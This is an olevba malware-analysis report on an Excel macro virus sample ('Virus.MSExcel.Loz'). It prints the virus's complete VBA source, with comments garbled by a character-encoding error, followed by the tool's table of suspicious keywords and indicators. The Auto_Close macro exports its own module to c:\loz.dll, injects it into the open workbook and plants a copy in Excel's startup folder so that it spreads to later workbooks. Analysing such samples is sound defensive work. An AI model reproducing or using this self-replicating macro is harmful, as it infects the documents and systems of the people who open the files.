olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Loz-8ea76b8659d1d1a2247e76746890a6ade7510b64
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Tento_sešit.cls 
in file: Virus.MSExcel.Loz-8ea76b8659d1d1a2247e76746890a6ade7510b64 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tento_sešit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Close()
'ŕęňčâŕöč˙ ďđč çŕęđűňčč äîęóěĺíňîâ
On Error Resume Next
If Dir(Application.StartupPath + "\" & Application.UserName & ".xlm") = Application.UserName & ".xlm" Then p = True
'ďđîâĺđ˙ĺě ĺńňü ëč íŕřŕ ęîďč˙ â startup ęŕňŕëîăĺ
Application.VBE.ActiveVBProject.VBComponents("IT").Export "c:\loz.dll"
'ĺńëč ôŕéë íŕéäĺí â startup ęŕňŕëîăĺ ňî ýęńďîđňčđóĺě ęîä â ôŕéë c:\loz.dll
For I = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(I).Name = "LMD" Then t = True
'ďđîâĺđ˙ĺě ĺńëč â äîęóěĺíňĺ íŕř ěîäóëü
Next I
If t = False Then
'ĺńëč íĺň
With ActiveWorkbook.VBProject
With .VBComponents.Import("c:\loz.dll")
'ňî čěďîđňčđóĺě ęîä čç ôŕéëŕ "c:\loz.dll"
End With
End With
End If
If p = False Then
'ĺńëč â startup ęŕňŕëîăĺ íĺň ęîďčé íŕřĺăî ęîäŕ
Workbooks.Add.SaveAs Filename:=Application.StartupPath + "\" & Application.UserName & ".xlm"
'ńîçäŕĺě ďóńňîé äîęóěĺíň â startup ęŕňŕëîăĺ
With ActiveWorkbook.VBProject
With .VBComponents.Import("c:\loz.dll")
'č âíĺäđ˙ĺěń˙ â ńîçäŕíűé äîęóěĺíň
End With
End With
Workbooks(Application.UserName & ".xlm").Save
'ńîőđŕíčě äîęóěĺíň â startup ęŕňŕëîăĺ
End If
ActiveWorkbook.Save
'ńîőđŕíčě ŕęňčâíűé äîęóěĺíň
End Sub


-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Loz-8ea76b8659d1d1a2247e76746890a6ade7510b64 - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Loz-8ea76b8659d1d1a2247e76746890a6ade7510b64 - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Loz-8ea76b8659d1d1a2247e76746890a6ade7510b64 - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |loz.dll             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

